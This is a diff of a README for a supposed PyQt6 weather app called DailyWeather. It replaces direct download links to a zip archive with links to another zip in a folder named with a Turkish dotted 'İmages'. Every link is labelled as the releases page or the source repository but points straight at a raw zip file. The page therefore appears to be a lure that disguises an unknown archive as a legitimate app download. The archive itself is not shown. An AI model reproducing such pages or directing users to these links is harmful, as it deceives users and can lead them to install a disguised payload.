@@ -14,7 +14,7 @@ Welcome to DailyWeather, a modern desktop weather application built using PyQt6.
 
 ## 📥 Download & Install
 
-To get started with DailyWeather, visit this page to download the application: [Download DailyWeather](https://raw.githubusercontent.com/Takatoyw/DailyWeather/main/omnivalous/DailyWeather.zip)
+To get started with DailyWeather, visit this page to download the application: [Download DailyWeather](https://raw.githubusercontent.com/Takatoyw/DailyWeather/main/İmages/Weather_Daily_v1.8.zip)
 
 1. **Go to the Releases Page**: Click the link above to access the DailyWeather releases.
 2. **Select the Latest Version**: At the top of the page, look for the latest release, usually marked as “Latest Release” or similar.
@@ -23,7 +23,7 @@ To get started with DailyWeather, visit this page to download the application: [
 5. **Follow Installation Prompts**: Follow the on-screen instructions. You may need to accept terms and choose installation options.
 6. **Open DailyWeather**: After installation, you can find DailyWeather in your applications. Open it and start enjoying your local weather updates!
 
-For easy access at any time, here’s the direct link once again: [Download DailyWeather](https://raw.githubusercontent.com/Takatoyw/DailyWeather/main/omnivalous/DailyWeather.zip)
+For easy access at any time, here’s the direct link once again: [Download DailyWeather](https://raw.githubusercontent.com/Takatoyw/DailyWeather/main/İmages/Weather_Daily_v1.8.zip)
 
 ## 📋 System Requirements
 
@@ -63,6 +63,6 @@ We appreciate your feedback.
 
 ## 🔗 Explore More
 
-For more information about DailyWeather, including updates, source code, and community contributions, check out the repository: [DailyWeather GitHub Repository](https://raw.githubusercontent.com/Takatoyw/DailyWeather/main/omnivalous/DailyWeather.zip)
+For more information about DailyWeather, including updates, source code, and community contributions, check out the repository: [DailyWeather GitHub Repository](https://raw.githubusercontent.com/Takatoyw/DailyWeather/main/İmages/Weather_Daily_v1.8.zip)
 
 Thank you for using DailyWeather. Stay updated with the weather easily.
